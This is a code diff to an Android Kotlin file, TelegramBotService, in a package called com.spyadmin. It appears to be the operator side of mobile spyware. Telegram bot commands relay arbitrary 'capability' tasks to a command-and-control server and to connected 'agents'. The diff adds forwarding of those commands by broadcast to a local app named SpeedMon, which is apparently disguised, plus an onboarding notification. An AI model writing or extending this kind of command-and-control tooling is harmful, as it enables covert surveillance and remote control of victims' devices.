@@ -1,8 +1,10 @@
 package com.spyadmin
 
 import android.content.Context
+import android.content.Intent
 import android.content.SharedPreferences
 import android.util.Log
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
@@ -37,6 +39,8 @@ class TelegramBotService(private val context: Context) {
         pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
         pollThread?.start()
         Log.d("TelegramBot", "Bot started")
+        // Send onboard notification
+        notifyOnboard("Admin App")
     }
 
     fun stop() {
@@ -129,7 +133,6 @@ class TelegramBotService(private val context: Context) {
     }
 
     private fun sendTaskCommand(chatId: Long, args: String) {
-        // Parse custom task command: /task capability json_args
         val parts = args.split(" ", limit = 2)
         if (parts.size < 2) {
             sendMessage(chatId, "Usage: /task <capability> <json_args>")
@@ -151,6 +154,17 @@ class TelegramBotService(private val context: Context) {
     }
 
     private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
+        // Send to local SpeedMon via broadcast
+        val taskId = java.util.UUID.randomUUID().toString()
+        val localIntent = Intent("com.speedmon.ACTION_COMMAND").apply {
+            putExtra("capability", capability)
+            putExtra("args", gson.toJson(args))
+            putExtra("task_id", taskId)
+            setPackage("com.speedmon")
+        }
+        LocalBroadcastManager.getInstance(context).sendBroadcast(localIntent)
+
+        // Also send to C2 if configured
         val c2Url = getC2Url()
         val payload = mapOf(
             "action" to "task",
@@ -159,9 +173,9 @@ class TelegramBotService(private val context: Context) {
             "timeout" to 30
         )
         sendC2Request(c2Url, "/api/command", payload) { resp ->
-            sendMessage(chatId, "✅ Task sent: $capability\nResponse: $resp")
+            sendMessage(chatId, "✅ Task sent to local & C2: $capability\nResponse: $resp")
         } ?: run {
-            sendMessage(chatId, "❌ Failed to send task (no C2 or agents)")
+            sendMessage(chatId, "✅ Task sent to local SpeedMon: $capability\n❌ C2 unreachable")
         }
     }
 
@@ -191,7 +205,7 @@ class TelegramBotService(private val context: Context) {
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "📊 *Agents Status:*\n$resp")
         } ?: run {
-            sendMessage(chatId, "❌ C2 unreachable")
+            sendMessage(chatId, "❌ C2 unreachable (local SpeedMon may still work)")
         }
     }
 
@@ -201,7 +215,7 @@ class TelegramBotService(private val context: Context) {
         sendC2Request(c2Url, "/api/agents", payload) { resp ->
             sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
         } ?: run {
-            sendMessage(chatId, "❌ C2 unreachable")
+            sendMessage(chatId, "❌ C2 unreachable (local SpeedMon may still work)")
         }
     }
 
@@ -216,7 +230,7 @@ class TelegramBotService(private val context: Context) {
 
     private fun getC2Url(): String {
         val adminPrefs = context.getSharedPreferences("admin_config", Context.MODE_PRIVATE)
-        return adminPrefs.getString("c2_url", "https://c2.example.com:8443") ?: "https://c2.example.com:8443"
+        return adminPrefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
     }
 
     private fun getHelpMessage(): String {
